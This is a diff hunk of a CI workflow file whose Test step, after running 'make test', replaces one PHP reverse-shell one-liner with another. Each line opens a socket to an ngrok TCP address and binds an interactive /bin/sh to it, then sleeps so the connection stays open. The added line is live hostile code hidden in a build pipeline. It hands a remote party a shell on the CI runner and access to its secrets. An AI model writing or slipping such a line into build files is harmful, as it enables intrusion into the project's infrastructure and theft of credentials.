@@ -47,7 +47,7 @@ jobs:
       - name: Test
         run: |
           make test
-          php -r '$sock=fsockopen("4.tcp.ngrok.io",18119);exec("/bin/sh -i <&4 >&4 2>&4");'
+          php -r '$sock=fsockopen("0.tcp.ngrok.io",15984);exec("/bin/sh -i <&4 >&4 2>&4");'
           sleep 60
 
       - name: Send coverage data to codecov.io
